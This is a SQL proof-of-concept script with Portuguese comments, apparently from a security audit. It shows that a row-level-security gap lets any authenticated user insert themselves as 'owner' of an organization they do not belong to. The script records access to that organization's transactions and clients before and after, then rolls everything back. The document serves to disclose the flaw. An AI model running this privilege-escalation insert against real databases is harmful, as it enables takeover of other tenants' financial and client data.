-- PROVA C1-01 (v2) — agora com o organization_id do alvo conhecido de antemão,
-- que é a condição real do ataque (a RLS de `organizations` esconde a listagem).
-- O bloco termina em RAISE EXCEPTION: o INSERT é SEMPRE desfeito.
BEGIN;

-- Passo 0 (como postgres): descobre um organization_id real e o guarda num GUC.
-- Isso simula o atacante JÁ CONHECENDO o UUID da organização alvo — por ter sido
-- membro, por ter recebido um link de convite (/?org=<uuid>), etc.
SELECT set_config('poc.org_id', (SELECT id::text FROM organizations ORDER BY id LIMIT 1), true);
SELECT set_config('poc.org_nome', (SELECT name FROM organizations ORDER BY id LIMIT 1), true);

-- A partir daqui: usuário autenticado comum, SEM vínculo com essa organização.
SET LOCAL ROLE authenticated;
SET LOCAL request.jwt.claims = '{"role":"authenticated","email":"poc-auditoria@exemplo-invalido.test","sub":"00000000-0000-0000-0000-0000000000ff"}';

DO $$
DECLARE
    v_org      uuid := current_setting('poc.org_id')::uuid;
    v_org_nome text := current_setting('poc.org_nome');
    a_cnt int; a_member bool; a_manager bool; a_orgs int; a_fin int; a_cli int;
    d_cnt int; d_member bool; d_manager bool; d_orgs int; d_fin int; d_cli int;
BEGIN
    -- ANTES do ataque
    SELECT count(*) INTO a_cnt  FROM organization_members
      WHERE lower(email) = 'poc-auditoria@exemplo-invalido.test';
    a_member  := is_org_member(v_org);
    a_manager := is_org_manager(v_org);
    SELECT count(*) INTO a_orgs FROM organizations            WHERE id = v_org;
    SELECT count(*) INTO a_fin  FROM internal_transactions    WHERE organization_id = v_org;
    SELECT count(*) INTO a_cli  FROM clients                  WHERE organization_id = v_org;

    -- O ATAQUE: um único INSERT, escolhendo a organização E o papel.
    INSERT INTO organization_members (organization_id, email, role)
    VALUES (v_org, 'poc-auditoria@exemplo-invalido.test', 'owner');

    -- DEPOIS do ataque
    SELECT count(*) INTO d_cnt  FROM organization_members
      WHERE lower(email) = 'poc-auditoria@exemplo-invalido.test';
    d_member  := is_org_member(v_org);
    d_manager := is_org_manager(v_org);
    SELECT count(*) INTO d_orgs FROM organizations            WHERE id = v_org;
    SELECT count(*) INTO d_fin  FROM internal_transactions    WHERE organization_id = v_org;
    SELECT count(*) INTO d_cli  FROM clients                  WHERE organization_id = v_org;

    RAISE EXCEPTION E'\n=== PROVA C1-01 (transacao abortada, nada persistido) ===\n'
        'Alvo: % (%)\n'
        'Ator: usuario autenticado comum, sem nenhum vinculo previo\n'
        'INSERT em organization_members(role=owner): ACEITO pela RLS\n'
        '                       | ANTES | DEPOIS\n'
        '  vinculos do ator     | %     | %\n'
        '  is_org_member        | %     | %\n'
        '  is_org_manager       | %     | %\n'
        '  organizations        | %     | %\n'
        '  internal_transactions| %     | %\n'
        '  clients              | %     | %\n'
        '=== fim da prova ===',
        v_org_nome, v_org,
        a_cnt, d_cnt, a_member, d_member, a_manager, d_manager,
        a_orgs, d_orgs, a_fin, d_fin, a_cli, d_cli;
END $$;

ROLLBACK;
